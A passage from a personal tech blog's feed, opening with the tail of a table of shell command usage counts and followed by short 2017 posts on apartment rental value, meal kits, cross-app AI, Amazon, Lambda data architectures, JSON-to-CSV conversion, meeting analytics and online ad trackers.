tr><td>touch</td><td>0</td><td>11</td><td>0.0%</td><td>0.1%</td></tr><tr><td>which</td><td>0</td><td>11</td><td>0.0%</td><td>0.1%</td></tr><tr><td>gt</td><td>0</td><td>10</td><td>0.0%</td><td>0.1%</td></tr><tr><td>\n</td><td>0</td><td>10</td><td>0.0%</td><td>0.1%</td></tr><tr><td>g</td><td>0</td><td>10</td><td>0.0%</td><td>0.1%</td></tr><tr><td>GEN_PASSWORD</td><td>0</td><td>10</td><td>0.0%</td><td>0.1%</td></tr><tr><td>wc</td><td>7</td><td>9</td><td>0.7%</td><td>0.1%</td></tr><tr><td>webpack</td><td>0</td><td>8</td><td>0.0%</td><td>0.1%</td></tr><tr><td>ruby</td><td>0</td><td>8</td><td>0.0%</td><td>0.1%</td></tr><tr><td>join</td><td>0</td><td>7</td><td>0.0%</td><td>0.1%</td></tr><tr><td>gem</td><td>0</td><td>7</td><td>0.0%</td><td>0.1%</td></tr><tr><td>crontab</td><td>0</td><td>7</td><td>0.0%</td><td>0.1%</td></tr><tr><td>cut</td><td>0</td><td>7</td><td>0.0%</td><td>0.1%</td></tr><tr><td>xmllint</td><td>0</td><td>7</td><td>0.0%</td><td>0.1%</td></tr><tr><td>protoc</td><td>0</td><td>7</td><td>0.0%</td><td>0.1%</td></tr><tr><td>ps</td><td>0</td><td>7</td><td>0.0%</td><td>0.1%</td></tr><tr><td>ffmpeg</td><td>0</td><td>7</td><td>0.0%</td><td>0.1%</td></tr><tr><td>unzip</td><td>0</td><td>6</td><td>0.0%</td><td>0.1%</td></tr><tr><td>sendEmail</td><td>0</td><td>6</td><td>0.0%</td><td>0.1%</td></tr><tr><td>airflow</td><td>0</td><td>5</td><td>0.0%</td><td>0.1%</td></tr><tr><td>chmod</td><td>0</td><td>5</td><td>0.0%</td><td>0.1%</td></tr><tr><td>java</td><td>0</td><td>5</td><td>0.0%</td><td>0.1%</td></tr><tr><td>conn</td><td>0</td><td>5</td><td>0.0%</td><td>0.1%</td></tr><tr><td>phantomjs</td><td>6</td><td>4</td><td>0.6%</td><td>0.0%</td></tr><tr><td>export</td><td>0</td><td>4</td><td>0.0%</td><td>0.0%</td></tr><tr><td>traceroute</td><td>0</td><td>4</td><td>0.0%</td><td>0.0%</td></tr><tr><td>sdk</td><td>0</td><td>4</td><td>0.0%</td><td>0.0%</td></tr><tr><td>textutil</td><td>0</td><td>4</td><td>0.0%</td><td>0.0%</td></tr><tr><td>ggl</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>top</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>pd</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>sort</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>cdjsonifyme</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>./grailsw</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>tunnel_prod</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>wpd</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>php</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>jupyter</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>code.</td><td>0</td><td>3</td><td>0.0%</td><td>0.0%</td></tr><tr><td>fab</td><td>70</td><td>0</td><td>7.3%</td><td>0.0%</td></tr><tr><td>stash</td><td>15</td><td>0</td><td>1.6%</td><td>0.0%</td></tr><tr><td>head</td><td>5</td><td>0</td><td>0.5%</td><td>0.0%</td></tr><tr><td>c_do</td><td>5</td><td>0</td><td>0.5%</td><td>0.0%</td></tr><tr><td>sh</td><td>4</td><td>0</td><td>0.4%</td><td>0.0%</td></tr><tr><td>make</td><td>4</td><td>0</td><td>0.4%</td><td>0.0%</td></tr><tr><td>sass</td><td>3</td><td>0</td><td>0.3%</td><td>0.0%</td></tr><tr><td>redis-cli</td><td>3</td><td>0</td><td>0.3%</td><td>0.0%</td></tr><tr><td>celery</td><td>3</td><td>0</td><td>0.3%</td><td>0.0%</td></tr><tr><td>source</td><td>2</td><td>0</td><td>0.2%</td><td>0.0%</td></tr><tr><td>sed</td><td>2</td><td>0</td><td>0.2%</td><td>0.0%</td></tr><tr><td>redis-server</td><td>2</td><td>0</td><td>0.2%</td><td>0.0%</td></tr><tr><td>dig</td><td>2</td><td>0</td><td>0.2%</td><td>0.0%</td></tr></tbody></table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Apartment rental arbitrage</title>
   <link href="http://dangoldin.com/2017/09/09/apartment-rental-arbitrage/"/>
   <updated>2017-09-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/09/09/apartment-rental-arbitrage</id>
   <content:encoded><![CDATA[
<p>Housing is one of the largest expenses and it’s worth trying to get the best deal you can. When it comes to finding an apartment rental there are a few tricks I’ve picked up that help find the best value. Generally, the approach is more suited for apartments that are being rented out by an owner rather than a development being rented out by a single company since there’s just more information out there.</p>

<p>The idea is pretty straightforward - estimate the total costs the owner is paying and then see how that compares to the listed rent. At least in the New York City area, the primary expenses when owning a home are the mortgage, taxes, and the maintenance fees. Each of these can be fetched or at least estimated using Zillow.</p>

<p>To calculate the monthly mortgage payment, Zillow provides the Zestimate and you can use a simple mortgage calculator assuming a common 20% down payment and a 30 year loan to get the monthly mortgage payment. The taxes may be available on the listing as well but if not they may be available from public records usually available online or estimated from another unit in the same building. The maintenance fee is usually the trickiest to get since it’s not typically listed unless the unit is for sale. The best way I’ve been able to get it is by looking at units in the building that are listed for sale and adjusting their maintenance fee by the ratio of floor space since maintenance fees are usually calculated based on square footage.</p>

<p>Adding these three numbers up should hopefully give you something that’s more than the rent. Then to see how good of a deal the rent is you just take the ratio of rent to our estimated monthly cost: the lower it is the better the value. I did this with a few units in the area and it turns out the majority of the ratios fell between 0.75 and 0.9 which makes sense since renting should be cheaper than owning.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Scaling meal kit distribution</title>
   <link href="http://dangoldin.com/2017/09/06/scaling-meal-kit-distribution/"/>
   <updated>2017-09-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/09/06/scaling-meal-kit-distribution</id>
   <content:encoded><![CDATA[
<p>Earlier today I read a neat <a href="https://www.theinformation.com/blue-apron-competitors-explore-sales-to-grocers-food-manufacturers">article</a> covering the meal-kit delivery space and how give Blue Apron’s lackluster performance on the public market the still-private competitors are exploring alternative options, including partnering with grocery stores and general CPG companies. I hadn’t thought much about the space but it’s a great idea.</p>

<p>Fresh food is a difficult business that benefits heavily from scale. Buying in bulk gives you significant price discounts and being able to have high throughput reduces the amount of food that spoils. One of the simplest ways to increase your scale is to increase the amount of distribution channels you have. These meal-kit delivery companies started by doing delivery to the home but there’s nothing stopping them from offering the same meal kits at grocery stores. In fact, maybe it makes sense to not even have an exclusive partnership with any single chain but try to get them into as many stores as possible. They’d have to do an accurate job modeling the demand but they’d likely be able to drop the price enough to make it attractive to customers. The biggest price reduction would come from not having to ship individual orders but instead deliver them in bulk to a single store. A more interesting version of this would be to actually allow the grocery store to contribute some of the ingredients - benefiting both.</p>

<p>This train of thought reminds me of Ben Thompson’s <a href="https://stratechery.com/2017/amazons-new-customer/">analysis</a> of why Amazon acquired Whole Foods: Amazon was buying itself a customer that could give it the scale it needed to run the Amazon playbook. It’s getting tougher and tougher to compete against Amazon and partnering up with complementary companies is a strong move by smaller competitors.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Cross app AI</title>
   <link href="http://dangoldin.com/2017/09/04/cross-app-ai/"/>
   <updated>2017-09-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/09/04/cross-app-ai</id>
   <content:encoded><![CDATA[
<p>More and more apps are starting to leverage some form of AI to improve the user experience. These range from inferring user preferences when surfacing new information to notifications that come just at the right time to be helpful. Google has been leading the pack here and nearly every product has some AI-based functionality built in: Photos is doing an unbelievable job of identifying faces and objects, Maps is all about pathfinding and is constantly improving as new data is collected, Assistant is probably my favorite new product and serves as a generic catch all for keeping track of my schedule and answering my ad hoc trivia questions.</p>

<p>While these services are constantly improving what I can’t wait for is one that is able to work across services and applications. Apps tend to be optimized for one specific use case but the real world requires tasks that consist of multiple steps. For many seemingly simple tasks I need to open a variety of apps and do a tiny bit in each app but would much prefer this could be done in a single request. An example of this is me figuring out whether I should take Citibike, the subway, or do a regular walk. In an ideal world this would be a function of the weather, bike and station availability, the train schedule, and whether I’m trying to get somewhere by a specific time. It’s possible to get all this information but by the time I dig through each of these sources it would have been better to just pick one and go with it. Yet if I had all the information at once it wouldn’t be too difficult to make an immediate decision.</p>

<p>I suppose what I want is an <a href="https://ifttt.com/">ifttt</a> that doesn’t require anyone to write integrations between apps but is able to self-develop the appropriate links and API connections. Sure it’s possible for someone to write the code manually for each combination but it’s just not tractable. This doesn’t seem as difficult as true <a href="https://en.wikipedia.org/wiki/Artificial_general_intelligence">artificial general intelligence</a> but it’s beyond what we currently have. My gut is that we’re not that far away - so much of our APIs are meticulously documented which should make the integrations easy - it’s just the cross app logic that depends on a variety of human contexts that’s difficult to program.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amazon's real leverage</title>
   <link href="http://dangoldin.com/2017/08/31/amazons-real-leverage/"/>
   <updated>2017-08-31T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/31/amazons-real-leverage</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/largest-employers-usa.png" width="950" height="1432" alt="Largest employers in USA" layout="responsive"/>
<p class="caption">Source: <a href="https://en.wikipedia.org/wiki/List_of_largest_employers_in_the_United_States">Wikipedia</a></p>

<p>Amazon’s an incredibly competitive company with a ton of defensive moats but one I haven’t seen mentioned much is also the one I think is one of the most powerful: its sheer number of employees. And rather than having them isolated to a few key offices they’re spread out across a variety of cities, states, and countries. Amazon has over 340,000 <a href="https://en.wikipedia.org/wiki/List_of_largest_employers_in_the_United_States">employees</a> which is almost 5 times the size of Google’s 72,000.</p>

<p>The benefit of these employees is that they give Amazon significant leverage when dealing with governments. By having such a large, unified block of people Amazon is able to push for special treatment that wouldn’t be given to any other company. They can have cities competing against one another to offer the best benefits in order to win an Amazon location. Winning the location would bring thousands of jobs to the community which would improve the economy, lead to a higher tax revenue, and generally make the city more popular. Amazon is still significantly overshadowed by Walmart at 2.3M employees but it puts them in an incredible position when compared to their competitors in tech.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Focus on the story</title>
   <link href="http://dangoldin.com/2017/08/28/focus-on-the-story/"/>
   <updated>2017-08-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/28/focus-on-the-story</id>
   <content:encoded><![CDATA[
<p>Last week we hosted a meetup describing the evolution of our data pipeline over the past 5 years - starting with a simple script to aggregate log files to a fully fledged big data system relying on a slew of technologies ranging from Kafka to Spark to Redshift. I find most meetups and presentations more focused on the present which is valuable but does a disservice to the audience by not describing the history, motivations, or thought process. No system lives in a vacuum and it’s much more interesting to look at the evolution of a system rather than focusing on its current state.</p>

<p>Seeing a large and complicated system for the first time is overwhelming but it’s incredibly unlikely it was built that way. Most likely it required multiple iterations with some subsystems being replaced by others until the present state was reached. Going over the evolution of a system reveals that process and makes the final result more approachable and relevant.</p>

<p>Stories are a core part of the human experience and we’re wired to think in narratives rather than standalone facts. The most interesting talks and presentations are done in the form of a story with an obstacle that needs to be overcome, a series of potential solutions and setbacks, and finally an approach that solves the problem once and for all. Technical talks don’t always lend themselves easily to a narrative but done right they end up being incredibly sticky and enjoyable. If you’re giving a talk on a technical topic, or any topic for that matter, see if you can do it as a story rather than listing a series of facts.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why live sports?</title>
   <link href="http://dangoldin.com/2017/08/27/why-live-sports/"/>
   <updated>2017-08-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/27/why-live-sports</id>
   <content:encoded><![CDATA[
<p>Yesterday the world was so abuzz with the Mayweather vs McGregor boxing match that even I couldn’t escape from hearing about it. One small tidbit I discovered was that it would cost you $100 just to watch it in the comfort of your own home. And while I definitely don’t consider myself a sports fan that still feels ridiculous.</p>

<p>Everyone believes that the live nature of sports makes them completely different than other media and yet that doesn’t strike a chord with me. I’ve been to some live events and when you’re with a group the real time element and environment is critical. This also goes for the case where you’re a huge fan and need to know everything as soon as possible. But for the casual fan having a couple of hour delay doesn’t seem that critical. Sure you have to avoid hearing or reading about the outcome but without that knowledge the two situations seem equivalent - at least rationally, if not emotionally.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A unified Lambda architecture</title>
   <link href="http://dangoldin.com/2017/08/25/a-unified-lambda-architecture/"/>
   <updated>2017-08-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/25/a-unified-lambda-architecture</id>
   <content:encoded><![CDATA[
<p>Lately I’ve been thinking about the <a href="https://en.wikipedia.org/wiki/Lambda_architecture">Lambda architecture</a> used in modern data pipelines. Lambda architectures are designed for systems that contain massive amounts of streaming data that needs to be processed and exposed quickly. The architecture consists of two different systems. One is  a real time pipeline that’s not perfectly accurate but is able to handle large volumes while providing a solid estimate quickly. The other is a batch process that is accurate but runs on a delay. By combining the two you get the best of both worlds - accurate historical data and reasonably correct recent data that will be corrected by the batch job when it runs.</p>

<p>A simple adtech example is to think of the events that are generated during a real time bidding auction. We start with an ad request which consists of everything an ad buyer would need to know before buying an ad - including the time, user agent, and location of the user. The buyer then submits a bid containing the ad they want to display along with the price they are willing to pay. If they win, the ad is rendered and there may be some follow up engagement events by the user - a mouseover and maybe even a click.</p>

<p>We can think of these 4 events as a sort of funnel - we have an ad request which may have a win event which may then have a mouse and then finally a click. The challenge is that there may be hundreds of these events being generated each second and it’s extremely rare that we would have all four events to join together. The likely case is that there was either a single ad request or an ad request followed by a win event. How do you build a system that’s able to handle non matched events that may arrive in random order?</p>

<p>In a batch system it’s straightforward - conceptually you’re doing a series of left joins while increasing the time window to make sure you capture events that may have trickled in after a cutoff. So in the case of us processing an hour’s worth of data we may want to pull in more than an hours worth of wins, mouseovers, and clicks to make sure we capture everything. The real time approach is similar but subtly different. First, we need to use a much smaller window since we can’t keep hundreds of millions of event in memory. Second, we need to build in logic to take into account the fact that the events may arrive in different order.</p>

<p>As engineers it’s our jobs to write code and logic that’s as reusable as possible and the Lambda architecture provides an interesting example of how difficult this can be. The batch and real time systems are doing very similar things yet the code to do each ends up being different. Something I’d love to see is some way to move the logic itself further upstream that defines the way these events should fit together and then the relevant code is generated for each subsystem. This would allow the actual join logic to be kept in a single place which would make it incredibly easy to add new events and fields as necessary.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Death of retail</title>
   <link href="http://dangoldin.com/2017/08/22/death-of-retail/"/>
   <updated>2017-08-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/22/death-of-retail</id>
   <content:encoded><![CDATA[
<p>I keep hearing that retail is dying and while I do believe that to be true it’s been difficult to see that from  living in the NYC area. The city streets are always bustling and while there are always some empty commercial spaces they seem to always get rented within a month or two. Yet this morning on my way to the office I came across a legitimate sign, literal and figurative, that brick and mortar retail is on its way out.</p>

<img src="http://dangoldin.com/assets/static/images/death-of-retail.jpg" alt="Death of retail" width="1512" height="2016" layout="responsive"/>

<p>This was a small store that primarily sold t-shirts and they posted a sign that the physical location is closing and the only storefront that’s left is online. Beyond that, they made a point to note that they have both a store on Amazon as well as on their own domain. Remarkably, they list the Amazon url first. If this isn’t a sign that Amazon is taking over I don’t know what is.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>JSON to CSV</title>
   <link href="http://dangoldin.com/2017/08/20/json-to-csv/"/>
   <updated>2017-08-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/20/json-to-csv</id>
   <content:encoded><![CDATA[
<p>A while back I needed to dump some some EC2 instance information into a CSV file for a quick analysis. Just to get it done I took the immediate approach of using the AWS API to pull the details and then just navigating the massively deep structure. This approach required code designed for that exact structure so it got me thinking of a more generic approach that would be able to extract CSV data from an arbitrary JSON structure. It’s a surprisingly tricky problem since JSON consists of both lists and dictionaries and can have a pretty hairy nesting structure. Just to get the EC2 instances one has to go through a list of reservations each containing a list of instances with the various fields at different hierarchy levels - and some depending on another value within the same structure.</p>

<p>The problem is similar to extracting various elements in HTML and one of my favorite solutions there is to use XPath. It’s straightforward to implement an XPath-like selector for JSON but the challenge is extract a set of fields at once while maintaining some sort of internal consistency - in the EC2 example an example is getting the public ip, the private ip, as well a tag name based on its key. To get this to work we need to take a list of XPath-like expressions that need to be evaluated concurrently in order to extract what’s needed.</p>

<p>The <a href="https://github.com/dangoldin/python-tools/blob/master/json_csv.py">first pass is up on GitHub</a> but there’s definitely a bit of work that still needs to be done. It’s been tested on a few simple files and examples but definitely doesn’t work for complex hierarchies or extractions.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A Snapcode in the mail</title>
   <link href="http://dangoldin.com/2017/08/12/a-snapcode-in-the-mail/"/>
   <updated>2017-08-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/12/a-snapcode-in-the-mail</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/snapcode-jet.jpg" alt="Snapcode for Jet.com" width="1512" height="2016" layout="responsive"/>

<p>Earlier today I received one of those typical promotions in the mail from Jet.com - $20 off for a $100 purchase. Nothing special about the offer itself but something I found fascinating was that there was a Snapcode that when scanned via Snapchat took you to a mobile optimized Jet.com page within Snapchat. Most mail I’ve seen has the callouts to encourage people to follow the brand on Facebook and Twitter but this promotion didn’t have either of those - just the Snapcode.</p>

<p>I haven’t seen this before and find it odd. Is it really the case that people are using Snapchat that frequently that they would open it up to scan a QR code that takes them to an ecommerce site? Maybe this was Jet.com categorizing me into the young and hip heavy Snapchat using audience segment. Maybe the fact that I noticed it and am writing this blog post is proof enough that replacing the social follows with a Snapcode was well worth it.</p>

<p>QR codes are extremely popular in Asia but have never taken off in the United States so it’s interesting to see them starting to appear, and potentially even take off, through Snapchat.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Start with pen and paper</title>
   <link href="http://dangoldin.com/2017/08/10/start-with-pen-and-paper/"/>
   <updated>2017-08-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/10/start-with-pen-and-paper</id>
   <content:encoded><![CDATA[
<p>Oftentimes when starting a new project I have a tendency to just dive in. It makes me feel immediately productive and I know I can just go back and tweak whatever needs tweaking. Yet almost always I suspect I would have been better of if I took the time to take a step back, get a sheet of paper and a pen, and think through the various steps and flows, even it was just a series of doodles.</p>

<p>In addition to taking a step back and slowing down it’s the changing of the medium that has strongest impact. Software tends to force us into a given structure but using a pen and paper gives us the ability to think differently. We don’t have to start typing or dragging elements onto a screen but are able to whatever we want. This opens a new possibility and especially for a problem requiring a creative solution provides a healthy boost.</p>

<p>Whiteboards have the same effect. It’s amazing how much more valuable whiteboard discussions are rather than conversations around a computer screen. It’s useful to start with a well structured document or presentation but the creative juices really start flowing when the whiteboard gets involved. A whiteboard removes the need for perfection and encourages ideas to keep growing on top of one another. Many will be crappy but even a crappy idea may engender a great one.</p>

<p>If you find yourself stuck with a problem staring at a computer I suggest changing the medium and going to pen and paper. It’s surprising what that simple act will do.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google Docs vs Confluence</title>
   <link href="http://dangoldin.com/2017/08/08/google-docs-vs-confluence/"/>
   <updated>2017-08-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/08/google-docs-vs-confluence</id>
   <content:encoded><![CDATA[
<p>I’ve been a happy user of Google Docs for years now and have yet to find another product that makes collaboration that easy or simple. It’s a well designed product with a ton of shortcuts that make it incredibly easy to be exceptionally productive. I can dive in and quickly leave a few comments as well as assign some todos knowing that the relevant folk will be notified. And for a very long time I’ve been using it for the bulk of my writing - including specs, design documents, and general note taking.</p>

<p>Yet as much as I enjoy using Google Docs I’ve started using Confluence more and more. We use JIRA and since they’re both part of the Atlassian suite of products they’re both nicely integrated. Confluence is a wiki platform so it provides a whole world of functionality that Google Docs just doesn’t offer - and rightfully so. Confluence comes with a bit more structure that makes it easy to create page templates with structured metadata that can then be organized and displayed based on that metadata. Somewhat remarkably, the Confluence search seems to be better than Google Docs - despite Google being the king of search; I really have no idea why the Google Docs search isn’t better. But the one thing that causes Confluence to win is the ability to have much more structured and better organized tasks. One can assign tasks in Google Docs but they’re treated as second class citizens - they don’t have due dates and are only visible when viewing a document. Confluence, on the other hand, makes it simple to add a todo with a due date on any page and then have all tasks aggregated into a single page. Of course I can have a separate tool tracking all my todos but it’s incredibly powerful to have tasks live next to their context.</p>

<p>I know I shouldn’t be comparing Google Docs with Confluence since they were designed for completely different purposes and yet I’ve resisted moving to Confluence due to how much more usable and friendly Google Docs felt. The lesson here is that we’re always going to favor what we’re comfortable with but it’s important to think about why some tools feel heavier and clunkier than others. There’s likely a reason they’re built and designed that way and are likely to solve our problems better than the tools we love but have to wrestle into submission.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Ephemeral data</title>
   <link href="http://dangoldin.com/2017/08/07/ephemeral-data/"/>
   <updated>2017-08-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/08/07/ephemeral-data</id>
   <content:encoded><![CDATA[
<p>A thought experiment that’s been on my mind lately is this idea of ephemeral data. Imagine a computer sending a message to another computer and then immediately deleting it. This message then gets sent from computer to computer without actually getting saved down anywhere. It doesn’t have a permanent home and just hops from machine to machine. If that computer shuts down before the message is passed on then it’s lost forever. Only by being on a machine when it receives a message do you get to see it - otherwise it keeps going along on its infinite journey. I like to think of this as information that only exists in wires and is constantly crossing the world at the speed of light.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing my meetings over time</title>
   <link href="http://dangoldin.com/2017/07/28/visualizing-my-meetings-over-time/"/>
   <updated>2017-07-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/07/28/visualizing-my-meetings-over-time</id>
   <content:encoded><![CDATA[
<p>As part of never ending goal to improve my efficiency I was curious to understand how my meeting habits have evolved over time. I had an old script that would <a href="http://dangoldin.com/2016/10/01/shaming-meeting-room-hogs/">identify meeting room hogs</a> and <a href="https://github.com/dangoldin/gcal-shaming/blob/master/meeting_duration_growth.py">repurposed it</a> to just download every one of my calendar events from when I joined TripleLift and another small script to <a href="https://github.com/dangoldin/gcal-shaming/blob/master/analyze.py">analyze</a> this data. Two things I had to filter out were multi day events which were tended to be vacations and events with me as the only attendee which were my reminders and todos. Unsurprisingly, there was a pretty large increase over time as we grew from a scrappy startup of 15 people to one with over 150 and as my role evolved from an individual contributor to a manager and then to the head of the engineering team.</p>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/num-meetings.png" alt="Number of meetings by month" width="1654" height="927" layout="responsive"/>
      <p class="caption">Clear growth in the number of meetings I have on my calendar with a pleasant dip in the holiday season.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/meeting-hours.png" alt="Meeting hours over time" width="1654" height="927" layout="responsive"/>
      <p class="caption">Sure enough the increase in meetings also led to an increase in the number of meeting hours.</p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/attendees-per-meeting.png" alt="" width="1654" height="927" layout="responsive"/>
      <p class="caption">I was curious to see whether the number of people in my meetings changed and this shows a worrying trend upwards.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A Google Docs efficiency win</title>
   <link href="http://dangoldin.com/2017/07/24/a-google-docs-efficiency-win/"/>
   <updated>2017-07-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/07/24/a-google-docs-efficiency-win</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/gdocs-old.png" width="450" height="565" layout="responsive" alt="Old Google Docs behavior"/>
  <p class="caption">Old Google Docs behavior</p>
</div>

<p>I’m an efficiency fiend and love seeing my heavily used products updated with any and all functionality that make them a tad easier to use. A few weeks ago, Google Docs, one of my most heavily used applications - in fact where I’m writing this very post - made a minor change to the “Move to” functionality that created one of these small efficiency wins. Before the change, clicking the small folder icon while in a document would show a menu with the item’s current location and a “Move this item” option. Clicking that behavior would enable move mode and would require the user to navigate to the appropriate folder and then confirming the move.</p>

<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/gdocs-new.png" width="450" height="571" layout="responsive" alt="Old Google Docs behavior"/>
  <p class="caption">New Google Docs behavior</p>
</div>

<p>Seems simple enough but in order to move a document required clicking that icon, switching to move mode, navigating with a few clicks, and then concluding the move with another click. The new behavior defaults to move mode and allows you to move the item to a folder without opening it up so long as it’s selected in the list.</p>

<p>This is a trivial change but shows how seriously Google takes usability and constantly thinking about the details. Beyond that, I use this a few times a day so that time saved adds up.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The wild world of online trackers</title>
   <link href="http://dangoldin.com/2017/07/23/the-wild-world-of-online-trackers/"/>
   <updated>2017-07-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/07/23/the-wild-world-of-online-trackers</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/whole-foods-ad.png" width="250" height="445" layout="responsive" alt="Whole foods ad"/>
</div>

<p>Working in AdTech I’m slightly more aware of how modern digital advertising works compared to the average person and get curious when I see an for a brand that I have never seen before. Just yesterday I was on Twitter and saw a Whole Foods ad for what I think was the first time. This got me thinking about what I must have done to get into their targeting list. Of course it may have just been a new campaign but I know enough to suspect it had something to do with my recent browsing behavior.</p>

<p>I tried thinking through what I did the previous couple of hours that could have piqued Whole Foods’ interest and the only thing I that could have been remotely relevant was that I placed a FreshDirect order. If that in fact was the case it seems a pretty big error on FreshDirect’s part. I’m a potential FreshDirect customer and they are giving my data and information away to Whole Foods, a competitor. Sure it’s all bits but it’s equivalent to a company giving their leads away to their competitors.</p>

<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/freshdirect-ghostery.png" width="154" height="660" layout="responsive" alt="Ghostery on FreshDirect's home page"/>
</div>

<p>This must have been unintentional but it highlights how complicated the modern AdTech ecosystem is. There are thousands of vendors firing trackers and sending data back and forth that is then used to create some pretty advanced audience segments. By running <a href="https://www.ghostery.com/">Ghostery</a> on the FreshDirect homepage one can see the different trackers used - in my case I saw 34 trackers with 3 of them being in the audience data business: Aggregate Knowledge, BlueKai, and eXelate. I suspect it was one of these companies that classified me as a potential grocery shopper and sold this data to Whole Foods.</p>

<p>It’s unlikely that FreshDirect would opt in to this behavior so there must be something else going on. Either they are working with these companies to retarget these users later and the data is getting leaked or these trackers are being dropped by some of the other vendors they’re using. Both cases pose a problem to FreshDirect and is something they should address. On the other hand, it may have been an intentional move by FreshDirect and they are in fact getting paid by these data companies to drop their trackers. Maybe they have enough faith in the stickiness of their product that they don’t worry about competition and will gladly share data with them for a price.</p>

<p>One can get deeper into this by seeing what script is dropping what other script but it’s an incredibly intricate web with tons of unexpected outcomes. I’d love to know how many companies actually understand what’s happening behind the scenes and how they’d react to this knowledge if they found out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Cities and outsourced infrastructure</title>
   <link href="http://dangoldin.com/2017/07/13/cities-and-outsourced-infrastructure/"/>
   <updated>2017-07-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/07/13/cities-and-outsourced-infrastructure</id>
   <content:encoded><![CDATA[
<p>Earlier today I read an interesting piece about the <a href="https://www.theinformation.com/chinas-bike-share-upstarts-face-tough-road-in-u-s">difficulty facing Chinese bike share companies</a> trying to enter the US market. The primary challenge is that many cities have already signed exclusive agreements with ride sharing companies and in many cases subsidized the initial investment. I find this fascinating since it highlights how even in relatively new industries it’s very easy to encounter established players that are difficult to dislodge - especially when they have the backing of the local government.</p>

<p>It’s great seeing governments trying to improve the quality of life for their citizens by investing in new businesses and technologies but it has to be done right. There will never be a final version of anything since innovation will consistently push newer and superior versions. By investing too much in the current version you may preclude yourself from investing in the improved versions of the future. At the same time if you hold out waiting for the next thing you end up hurting the current experience. It’s a tough balance that’s only getting more difficult as the pace of innovation increases.</p>

<p>Rather than partnering I’d like to see the government offer time based licenses and leases on the various components of city infrastructure. This would allow companies to evaluate the opportunity and use that to determine the price they’d be willing to pay. It would also encourage them to futureproof their developments as much as possible in order to take advantage of a constantly changing world. This wouldn’t work for major infrastructure investments that would last multiple decades, such as subways and roads, but I do see it working out for improvements that last a decade.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Increasing software engineer specialization</title>
   <link href="http://dangoldin.com/2017/07/09/increasing-software-engineer-specialization/"/>
   <updated>2017-07-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/07/09/increasing-software-engineer-specialization</id>
   <content:encoded><![CDATA[
<p>I’m not sure if it’s always been this way and I just never realized it but it seems there’s a lot of specialization happening within the software engineering industry. For a long time it felt that the majority of the software industry field was shallow enough that being a strong developer was enough to get into anything of interest. Now it does feel as if the industry is turning a corner and there’s significantly more specialization. There have always been exceptions in the past but it does feel specialization was along the edges - now there’s enough depth in the industry that it’s difficult to be a general software engineer, especially further in a career.</p>

<p>Just by looking at various job postings I see the following roles: frontend developer (and within here there are various splits by technology), data engineer, machine learning and AI engineer, mobile developer (which is further divided by iOS and Android), devops engineer, security engineer, sales engineer, and database engineer. And this just scratches the surface - there’s also a ton of software engineering work happening on the hardware side which comes with its own principles.</p>

